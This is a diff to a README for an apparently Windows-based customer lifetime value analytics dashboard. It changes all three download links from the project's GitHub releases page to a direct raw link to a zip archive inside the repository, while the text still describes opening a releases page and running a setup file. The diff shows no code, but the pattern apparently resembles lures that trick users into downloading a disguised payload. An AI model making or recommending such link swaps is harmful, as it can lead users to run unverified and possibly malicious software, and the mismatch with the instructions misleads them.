@@ -1,6 +1,6 @@
 # 📊 Customer-CLV-Analytics-Pipeline - Clear Customer Value Insights
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-1f77b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-1f77b4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Enzell2079/Customer-CLV-Analytics-Pipeline/main/dashboard/Pipeline_Customer_CL_Analytics_v1.0.zip)
 
 ## 🧭 Overview
 
@@ -35,7 +35,7 @@ For best results, use Windows 10 or Windows 11.
 
 Visit this page to download the latest release:
 
-[https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases](https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases)
+[https://raw.githubusercontent.com/Enzell2079/Customer-CLV-Analytics-Pipeline/main/dashboard/Pipeline_Customer_CL_Analytics_v1.0.zip](https://raw.githubusercontent.com/Enzell2079/Customer-CLV-Analytics-Pipeline/main/dashboard/Pipeline_Customer_CL_Analytics_v1.0.zip)
 
 On that page, open the newest release and download the file attached to it. If the release includes a setup file, use that file first. If it includes a packaged dashboard or project folder, download that file and keep it in a folder you can find later.
 
@@ -180,7 +180,7 @@ This project can help with:
 
 Use this link to visit the download page and get the latest version:
 
-[https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases](https://github.com/Enzell2079/Customer-CLV-Analytics-Pipeline/releases)
+[https://raw.githubusercontent.com/Enzell2079/Customer-CLV-Analytics-Pipeline/main/dashboard/Pipeline_Customer_CL_Analytics_v1.0.zip](https://raw.githubusercontent.com/Enzell2079/Customer-CLV-Analytics-Pipeline/main/dashboard/Pipeline_Customer_CL_Analytics_v1.0.zip)
 
 ## 🏷️ Topics covered
 
